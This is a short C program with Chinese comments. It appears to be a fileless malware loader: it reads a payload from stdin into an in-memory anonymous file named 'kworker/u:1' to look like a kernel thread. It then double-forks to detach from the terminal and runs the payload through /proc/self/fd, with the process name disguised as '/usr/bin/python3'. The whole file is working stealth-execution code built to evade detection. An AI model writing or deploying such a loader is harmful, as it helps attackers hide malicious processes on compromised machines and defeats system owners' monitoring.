#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

// 每次读取的块大小
#define CHUNK_SIZE 4096

int main(int argc, char *argv[]) {
    // 1. 在内存中创建一个匿名文件描述符
    // 名字设为 "kworker/u:1"，模仿 Linux 内核工作线程名
    int fd = memfd_create("kworker/u:1", MFD_CLOEXEC);
    if (fd == -1) return 1;

    // 2. 动态读取 stdin 中的数据（解决硬编码和固定大小限制）
    size_t total_read = 0;
    unsigned char buffer[CHUNK_SIZE];
    ssize_t n;

    // 循环读取直到标准输入结束
    while ((n = read(STDIN_FILENO, buffer, CHUNK_SIZE)) > 0) {
        if (write(fd, buffer, n) != n) {
            return 1;
        }
        total_read += n;
    }

    if (total_read == 0) return 1;

    // 3. 后台化 (Daemonize)
    if (fork() > 0) exit(0); // 父进程退出
    setsid();                // 创建新会话
    if (fork() > 0) exit(0); // 第二次 fork，彻底脱离终端

    // 4. 执行内存中的载荷
    // 我们将 argv[0] 改为 "/usr/bin/python3" 来进行进程名伪装
    char *new_argv[] = {"/usr/bin/python3", NULL};
    char *new_envp[] = {NULL};

    // 5. 通过 /proc 执行 (兼容性最强的方法)
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    
    // 执行！
    execve(path, new_argv, new_envp);

    return 0;
}